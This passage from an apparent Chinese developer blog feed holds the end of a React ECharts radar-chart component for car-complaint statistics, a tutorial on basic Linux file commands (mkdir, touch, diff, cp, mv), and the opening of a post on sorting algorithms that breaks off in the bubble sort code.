spellcheck="true">// 设置雷达图中间射线的颜色</span>                axisLine<span class="token punctuation">:</span> <span class="token punctuation">{</span>                    lineStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>                        color<span class="token punctuation">:</span> <span class="token string">'#ddd'</span><span class="token punctuation">,</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                indicator<span class="token punctuation">:</span> <span class="token punctuation">[</span>                    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"车辆已售"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">380</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"商家冒充个人"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">290</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"商家服务态度差"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">450</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"电话无法接通"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"走私套牌抵押车"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">480</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"价格高于标价"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"卖新车"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"图片与车款不符合"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token number">333</span><span class="token punctuation">,</span><span class="token string">"max"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">}</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//雷达图背景的颜色，在这儿随便设置了一个颜色，完全不透明度为0，就实现了透明背景</span>                splitArea <span class="token punctuation">:</span> <span class="token punctuation">{</span>                    show <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                    areaStyle <span class="token punctuation">:</span> <span class="token punctuation">{</span>                        color<span class="token punctuation">:</span> <span class="token string">'rgba(255,0,0,0)'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 图表背景的颜色</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            series<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>                name<span class="token punctuation">:</span> <span class="token string">'投诉统计'</span><span class="token punctuation">,</span>                type<span class="token punctuation">:</span> <span class="token string">'radar'</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//显示雷达图选中背景</span>                areaStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>normal<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                data<span class="token punctuation">:</span> <span class="token punctuation">[</span>                    <span class="token punctuation">{</span>                        value <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">380</span><span class="token punctuation">,</span> <span class="token number">290</span><span class="token punctuation">,</span> <span class="token number">450</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">480</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">350</span><span class="token punctuation">,</span> <span class="token number">333</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                        <span class="token comment" spellcheck="true">// 设置区域边框和区域的颜色</span>                        itemStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>                            normal<span class="token punctuation">:</span> <span class="token punctuation">{</span>                                <span class="token comment" spellcheck="true">//雷达图背景渐变设置</span>                                color<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">echarts<span class="token punctuation">.</span>graphic<span class="token punctuation">.</span>LinearGradient</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>                                    offset<span class="token punctuation">:</span> <span class="token number">0.5</span><span class="token punctuation">,</span>                                    color<span class="token punctuation">:</span> <span class="token string">'rgba(48,107, 231, 1)'</span>                                <span class="token punctuation">}</span><span class="token punctuation">,</span>                                <span class="token punctuation">{</span>                                    offset<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>                                    color<span class="token punctuation">:</span> <span class="token string">'rgba(73,168, 255, 0.7)'</span>                                <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                <span class="token comment" spellcheck="true">//去除刻度</span>                                opacity<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>                                <span class="token comment" spellcheck="true">//雷达图边线样式</span>                                lineStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>                                    width<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                                    color<span class="token punctuation">:</span> <span class="token string">'#306BE7'</span><span class="token punctuation">,</span>                                <span class="token punctuation">}</span><span class="token punctuation">,</span>                            <span class="token punctuation">}</span><span class="token punctuation">,</span>                        <span class="token punctuation">}</span><span class="token punctuation">,</span>                        name <span class="token punctuation">:</span> <span class="token string">'今日更新投诉量'</span><span class="token punctuation">,</span>                        id<span class="token punctuation">:</span> <span class="token string">"jintian"</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">{</span>                        value <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">370</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                        <span class="token comment" spellcheck="true">// 设置区域边框和区域的颜色</span>                        itemStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>                            normal<span class="token punctuation">:</span> <span class="token punctuation">{</span>                                color<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">echarts<span class="token punctuation">.</span>graphic<span class="token punctuation">.</span>LinearGradient</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>                                    offset<span class="token punctuation">:</span> <span class="token number">0.5</span><span class="token punctuation">,</span>                                    color<span class="token punctuation">:</span> <span class="token string">'rgba(139,241, 134, 0.7)'</span>                                <span class="token punctuation">}</span><span class="token punctuation">,</span>                                <span class="token punctuation">{</span>                                    offset<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>                                    color<span class="token punctuation">:</span> <span class="token string">'rgba(0,208, 131, 1)'</span>                                <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                opacity<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>                                lineStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>                                    width<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                                    color<span class="token punctuation">:</span> <span class="token string">'#8BF186'</span><span class="token punctuation">,</span>                                <span class="token punctuation">}</span><span class="token punctuation">,</span>                            <span class="token punctuation">}</span><span class="token punctuation">,</span>                        <span class="token punctuation">}</span><span class="token punctuation">,</span>                        name <span class="token punctuation">:</span> <span class="token string">'昨日更新投诉量'</span><span class="token punctuation">,</span>                        id<span class="token punctuation">:</span> <span class="token string">"zuotian"</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">]</span>            <span class="token punctuation">}</span><span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * @description 雷达图选中区域点击事件和外部显示标签点击事件     * @param {any} param      * @param {any} echarts      * @memberof EchartsRadar     */</span>    <span class="token function">onChartClick</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span>echarts<span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * @description 点击legend事件     * @param {any} param      * @param {any} echarts      * @memberof EchartsRadar     */</span>    <span class="token function">onChartLegendselectchanged</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span>echarts<span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">componentWillReceiveProps</span><span class="token punctuation">(</span>nextProps<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token function">componentWillMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token function">componentDidMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">let</span> onEvents<span class="token operator">=</span><span class="token punctuation">{</span>            <span class="token string">'click'</span><span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>onChartClick<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'legendselectchanged'</span><span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>onChartLegendselectchanged<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span><span class="token punctuation">(</span>            <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"echartsRadar"</span><span class="token operator">></span>                <span class="token operator">&lt;</span>ReactEcharts                    option<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getOption</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>                     notMerge<span class="token operator">=</span><span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">}</span>                    lazyUpdate<span class="token operator">=</span><span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">}</span>                    onEvents<span class="token operator">=</span><span class="token punctuation">{</span>onEvents<span class="token punctuation">}</span>                    style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>width<span class="token punctuation">:</span> <span class="token string">'100%'</span><span class="token punctuation">,</span>height<span class="token punctuation">:</span><span class="token string">'100%'</span><span class="token punctuation">}</span><span class="token punctuation">}</span>                <span class="token operator">/</span><span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>        <span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>依赖样式echartsRadar.scss：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">.</span>echartsRadar<span class="token punctuation">{</span>    display<span class="token punctuation">:</span> flex<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// align-items: center;</span>    justify<span class="token operator">-</span>content<span class="token punctuation">:</span> center<span class="token punctuation">;</span>    height<span class="token punctuation">:</span> 400px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span>echartsPie<span class="token punctuation">{</span>    display<span class="token punctuation">:</span> flex<span class="token punctuation">;</span>    justify<span class="token operator">-</span>content<span class="token punctuation">:</span> center<span class="token punctuation">;</span>    height<span class="token punctuation">:</span> 280px<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
            <tag> Echarts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基本命令</title>
      <link href="2018/10/15/linuxbase/"/>
      <url>2018/10/15/linuxbase/</url>
      
        <content type="html"><![CDATA[<h2 id="1、判断文件夹是否存在"><a href="#1、判断文件夹是否存在" class="headerlink" title="1、判断文件夹是否存在"></a>1、判断文件夹是否存在</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token operator">-</span>d backup <span class="token punctuation">]</span><span class="token punctuation">;</span>then    <span class="token comment" spellcheck="true">//不存在 创建多级目录</span>    mkdir <span class="token operator">-</span>p backup<span class="token operator">/</span>demofi    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>注意：if条件判断结束一定要加”;“  方括号[]两边一定要有空格</p><p>参数说明：</p><ul><li>-e filename    如果filename存在，则为true</li><li>-d filename    如果filename为目录，则为true</li><li>-f filename     如果filename为常规文件，则为真 </li><li>-L filename    如果 filename为符号链接，则为真 </li><li>-r filename    如果 filename可读，则为真 </li><li>-w filename   如果 filename可写，则为真 </li><li>-x filename    如果 filename可执行，则为真 </li><li>-s filename    如果文件长度不为0，则为真 </li><li>-h filename   如果文件是软链接，则为真</li></ul><h2 id="2、创建文件夹、文件"><a href="#2、创建文件夹、文件" class="headerlink" title="2、创建文件夹、文件"></a>2、创建文件夹、文件</h2><h3 id="2-1、创建文件夹"><a href="#2-1、创建文件夹" class="headerlink" title="2.1、创建文件夹"></a>2.1、创建文件夹</h3><p>mkdir 文件夹</p><blockquote><p>mkdir file 创建file空目录</p></blockquote><p>mkdir -m 设定权限</p><blockquote><p>mkdir -m 777 file  创建可读可写可执行权限的file文件夹</p></blockquote><p>mkdir -p 递归创建多级目录</p><blockquote><p>mkdir -p file1/file2/file3</p></blockquote><p>mkdir -v 每次创建新目录都显示信息</p><blockquote><p>mkdir -v file</p><p>显示信息：mkdir: created directory ‘file’</p></blockquote><pre class="line-numbers language-js"><code class="language-js">mkdir <span class="token operator">-</span>pv scf<span class="token regex">/{lib/</span><span class="token punctuation">,</span>bin<span class="token operator">/</span><span class="token punctuation">,</span>doc<span class="token operator">/</span><span class="token punctuation">{</span>info<span class="token punctuation">,</span>product<span class="token punctuation">}</span><span class="token punctuation">,</span>logs<span class="token operator">/</span><span class="token punctuation">{</span>info<span class="token punctuation">,</span>product<span class="token punctuation">}</span><span class="token punctuation">,</span>service<span class="token operator">/</span>deploy<span class="token operator">/</span><span class="token punctuation">{</span>info<span class="token punctuation">,</span>product<span class="token punctuation">}</span><span class="token punctuation">}</span>mkdir<span class="token punctuation">:</span> 已创建目录 “scf”mkdir<span class="token punctuation">:</span> 已创建目录 “scf<span class="token operator">/</span>lib”mkdir<span class="token punctuation">:</span> 已创建目录 “scf<span class="token operator">/</span>bin”mkdir<span class="token punctuation">:</span> 已创建目录 “scf<span class="token operator">/</span>doc”mkdir<span class="token punctuation">:</span> 已创建目录 “scf<span class="token operator">/</span>doc<span class="token operator">/</span>info”mkdir<span class="token punctuation">:</span> 已创建目录 “scf<span class="token operator">/</span>doc<span class="token operator">/</span>product”mkdir<span class="token punctuation">:</span> 已创建目录 “scf<span class="token operator">/</span>logs”mkdir<span class="token punctuation">:</span> 已创建目录 “scf<span class="token operator">/</span>logs<span class="token operator">/</span>info”mkdir<span class="token punctuation">:</span> 已创建目录 “scf<span class="token operator">/</span>logs<span class="token operator">/</span>product”mkdir<span class="token punctuation">:</span> 已创建目录 “scf<span class="token operator">/</span>service”mkdir<span class="token punctuation">:</span> 已创建目录 “scf<span class="token operator">/</span>service<span class="token operator">/</span>deploy”mkdir<span class="token punctuation">:</span> 已创建目录 “scf<span class="token operator">/</span>service<span class="token operator">/</span>deploy<span class="token operator">/</span>info”mkdir<span class="token punctuation">:</span> 已创建目录 “scf<span class="token operator">/</span>service<span class="token operator">/</span>deploy<span class="token operator">/</span>product”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2、创建文件"><a href="#2-2、创建文件" class="headerlink" title="2.2、创建文件"></a>2.2、创建文件</h3><p>touch 用来创建文件或者修改文件的时间戳</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">-</span>a：或<span class="token operator">--</span>time<span class="token operator">=</span>atime或<span class="token operator">--</span>time<span class="token operator">=</span>access或<span class="token operator">--</span>time<span class="token operator">=</span>use  只更改存取时间；<span class="token operator">-</span>c：或<span class="token operator">--</span>no<span class="token operator">-</span>create  不建立任何文件；<span class="token operator">-</span>d：<span class="token operator">&lt;</span>时间日期<span class="token operator">></span> 使用指定的日期时间，而非现在的时间；<span class="token operator">-</span>f：此参数将忽略不予处理，仅负责解决BSD版本touch指令的兼容性问题；<span class="token operator">-</span>m：或<span class="token operator">--</span>time<span class="token operator">=</span>mtime或<span class="token operator">--</span>time<span class="token operator">=</span>modify  只更该变动时间；<span class="token operator">-</span>r：<span class="token operator">&lt;</span>参考文件或目录<span class="token operator">></span>  把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；<span class="token operator">-</span>t：<span class="token operator">&lt;</span>日期时间<span class="token operator">></span>  使用指定的日期时间，而非现在的时间；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建不存在文件</p><blockquote><p>touch file.txt</p></blockquote><p>一次创建多个文件</p><blockquote><p>touch file1.txt file2.txt file3.txt</p></blockquote><p>在文件夹里面添加</p><blockquote><p>touch test/file.txt</p></blockquote><h2 id="3、文件对比命令"><a href="#3、文件对比命令" class="headerlink" title="3、文件对比命令"></a>3、文件对比命令</h2><p>diff [选项] from-file to-file</p><p>from-file:对比源文件</p><p>to-file:对比目标文件</p><p>选项：</p><ul><li>-&lt;行数&gt;：指定要显示多少行的文本。此参数必须与-c或-u参数一并使用</li><li>-a或–text：diff预设只会逐行比较文本文件</li><li>-b或–ignore-space-change：不检查空格字符的不同</li><li>-B或–ignore-blank-lines：不检查空白行</li><li>-c 　显示全部内文，并标出不同之处。</li><li>-C&lt;行数&gt;或–context&lt;行数&gt; 　与执行”-c-&lt;行数&gt;”指令相同。</li><li>-d或–minimal 　使用不同的演算法，以较小的单位来做比较。</li><li>-D&lt;巨集名称&gt;或ifdef&lt;巨集名称&gt; 　此参数的输出格式可用于前置处理器巨集。</li><li>-e或–ed 　此参数的输出格式可用于ed的script文件。</li><li>-f或-forward-ed 　输出的格式类似ed的script文件，但按照原来文件的顺序来显示不同处。</li><li>-H或–speed-large-files 　比较大文件时，可加快速度。</li><li>-l&lt;字符或字符串&gt;或–ignore-matching-lines&lt;字符或字符串&gt; 　若两个文件在某几行有所不同，而这几行同时都包含了选项中指定的字符或字符串，则不显示这两个文件的差异。</li><li>-i或–ignore-case 　不检查大小写的不同。</li><li>-l或–paginate 　将结果交由pr程序来分页。</li><li>-n或–rcs 　将比较结果以RCS的格式来显示。</li><li>-N或–new-file 　在比较目录时，若文件A仅出现在某个目录中，预设会显示：</li><li>Only in目录：文件A若使用-N参数，则diff会将文件A与一个空白的文件比较。</li><li>-p 　若比较的文件为C语言的程序码文件时，显示差异所在的函数名称。</li><li>-P或–unidirectional-new-file 　与-N类似，但只有当第二个目录包含了一个第一个目录所没有的文件时，才会将这个文件与空白的文件做比较。</li><li>-q或–brief 　仅显示有无差异，不显示详细的信息。</li><li>-r或–recursive 　比较子目录中的文件。</li><li>-s或–report-identical-files 　若没有发现任何差异，仍然显示信息。</li><li>-S&lt;文件&gt;或–starting-file&lt;文件&gt; 　在比较目录时，从指定的文件开始比较。</li><li>-t或–expand-tabs 　在输出时，将tab字符展开。</li><li>-T或–initial-tab 　在每行前面加上tab字符以便对齐。</li><li>-u,-U&lt;列数&gt;或–unified=&lt;列数&gt; 　以合并的方式来显示文件内容的不同。</li><li>-v或–version 　显示版本信息。</li><li>-w或–ignore-all-space 　忽略全部的空格字符。</li><li>-W&lt;宽度&gt;或–width&lt;宽度&gt; 　在使用-y参数时，指定栏宽。</li><li>-x&lt;文件名或目录&gt;或–exclude&lt;文件名或目录&gt; 　不比较选项中所指定的文件或目录。</li><li>-X&lt;文件&gt;或–exclude-from&lt;文件&gt; 　您可以将文件或目录类型存成文本文件，然后在=&lt;文件&gt;中指定此文本文件。</li><li>-y或–side-by-side 　以并列的方式显示文件的异同之处。</li><li>–help 　显示帮助。</li><li>–left-column 　在使用-y参数时，若两个文件某一行内容相同，则仅在左侧的栏位显示该行内容。</li><li>–suppress-common-lines 　在使用-y参数时，仅显示不同之处</li></ul><blockquote><p>diff test.sh test1.sh </p></blockquote><p>输出：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token number">1</span><span class="token punctuation">,</span>4d0<span class="token operator">&lt;</span> <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"`diff -w package.json ./rntest/cstTask/package.json`"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>then<span class="token operator">&lt;</span>   echo <span class="token template-string"><span class="token string">`diff -w package.json ./rntest/cstTask/package.json`</span></span><span class="token operator">&lt;</span>   mkdir tests<span class="token operator">&lt;</span> fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、拷贝命令"><a href="#4、拷贝命令" class="headerlink" title="4、拷贝命令"></a>4、拷贝命令</h2><h3 id="4-1、文件复制命令"><a href="#4-1、文件复制命令" class="headerlink" title="4.1、文件复制命令"></a>4.1、文件复制命令</h3><p>cp [选项] 源文件（source） 目标文件或者目录（destination）</p><ul><li>-a: 是指archive的意思，也说是指复制所有的目录</li><li>-d: 若源文件为连接文件(link file)，则复制连接文件属性而非文件本身</li><li>-f: 强制(force)，若有重复或其它疑问时，不会询问用户，而强制复制</li><li>-i: 若目标文件(destination)已存在，在覆盖时会先询问是否真的操作</li><li>-l: 建立硬连接(hard link)的连接文件，而非复制文件本身</li><li>-p: 与文件的属性一起复制，而非使用默认属性</li><li>-r: 递归复制，用于目录的复制操作</li><li>-s: 复制成符号连接文件(symbolic link)，即“快捷方式”文件</li><li>-u: 若目标文件比源文件旧，更新目标文件 </li></ul><blockquote><p>cp -f package.json ./backup</p></blockquote><h3 id="4-2、文件移动"><a href="#4-2、文件移动" class="headerlink" title="4.2、文件移动"></a>4.2、文件移动</h3><p>mv [选项] source destination</p><ul><li>-f: force，强制直接移动而不询问</li><li>-i: 若目标文件(destination)已经存在，就会询问是否覆盖</li><li>-u: 若目标文件已经存在，且源文件比较新，才会更新</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端十大经典算法</title>
      <link href="2018/09/04/algorithm/"/>
      <url>2018/09/04/algorithm/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1362393380&auto=1&height=66"></iframe><h2 id="算法概述"><a href="#算法概述" class="headerlink" title="算法概述"></a>算法概述</h2><h3 id="算法分类"><a href="#算法分类" class="headerlink" title="算法分类"></a>算法分类</h3><p>十种常见排序算法可以分为两大类：</p><blockquote><p><strong>非线性时间比较类排序</strong>：通过比较来决定元素间的相对次序，由于其时间复杂度不能突破O(nlogn)，因此称为非线性时间比较类排序。</p><p><strong>线性时间非比较类排序</strong>：不通过比较来决定元素间的相对次序，它可以突破基于比较排序的时间下界，以线性时间运行，因此称为线性时间非比较类排序。 </p></blockquote><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/sf11.png" alt="img"></p><h3 id="算法复杂度"><a href="#算法复杂度" class="headerlink" title="算法复杂度"></a>算法复杂度</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/sf12.png" alt="img"></p><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><blockquote><p><strong>稳定</strong>：如果a原本在b前面，而a=b，排序之后a仍然在b的前面。</p><p><strong>不稳定</strong>：如果a原本在b的前面，而a=b，排序之后 a 可能会出现在 b 的后面。</p><p><strong>时间复杂度</strong>：对排序数据的总的操作次数。反映当n变化时，操作次数呈现什么规律。</p><p><strong>空间复杂度：</strong>是指算法在计算机内执行时所需存储空间的度量，它也是数据规模n的函数。 </p></blockquote><h2 id="冒泡排序（Bubble-Sort）"><a href="#冒泡排序（Bubble-Sort）" class="headerlink" title="冒泡排序（Bubble Sort）"></a>冒泡排序（Bubble Sort）</h2><p>冒泡排序是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果它们的顺序错误就把它们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。 </p><h3 id="1-1-算法描述"><a href="#1-1-算法描述" class="headerlink" title="1.1 算法描述"></a>1.1 算法描述</h3><ul><li>比较相邻的元素。如果第一个比第二个大，就交换它们两个；</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对，这样在最后的元素应该会是最大的数；</li><li>针对所有的元素重复以上的步骤，除了最后一个；</li><li>重复步骤1~3，直到排序完成。</li></ul><h3 id="1-2-动图演示"><a href="#1-2-动图演示" class="headerlink" title="1.2 动图演示"></a>1.2 动图演示</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/sf1.gif" alt="img"></p><p>1.3 代码实现</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token 